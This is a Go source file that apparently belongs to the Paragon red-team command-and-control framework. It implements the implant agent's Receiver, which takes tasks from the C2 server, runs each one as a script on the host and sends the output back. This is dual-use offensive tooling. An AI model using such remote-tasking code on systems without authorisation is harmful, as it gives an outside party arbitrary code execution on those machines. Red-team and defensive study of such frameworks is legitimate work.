package main

import (
	"bytes"
	"context"

	"github.com/kcarretto/paragon/pkg/agent"
	"github.com/kcarretto/paragon/pkg/c2"
	"github.com/kcarretto/paragon/pkg/script"
	"github.com/kcarretto/paragon/pkg/script/stdlib"
	"go.uber.org/zap"
)

// Receiver is responsible for handling messages from the server.
type Receiver struct {
	context.Context

	Log *zap.Logger
}

// Receive messages from the server, executing tasks as scripts.
func (r Receiver) Receive(w agent.MessageWriter, msg agent.ServerMessage) {
	r.Log.Debug("Received new payload from server",
		zap.Int("num_tasks", len(msg.Tasks)),
		zap.Reflect("payload", msg),
	)

	for _, task := range msg.Tasks {
		result := &c2.TaskResult{
			Id: task.GetId(),
		}
		result.Start()

		output := new(bytes.Buffer)

		code := script.New(
			string(task.GetId()),
			bytes.NewBufferString(task.Content),
			script.WithOutput(output),
			stdlib.Load(),
		)

		err := code.Exec(r)
		if err != nil {
			r.Log.Error("failed to execute script", zap.Error(err), zap.Int64("task_id", task.GetId()))
		}

		r.Log.Debug("completed script execution", zap.String("task", task.String()))

		result.Output = output.String()
		result.CloseWithError(err)
		w.WriteResult(result)
	}
}
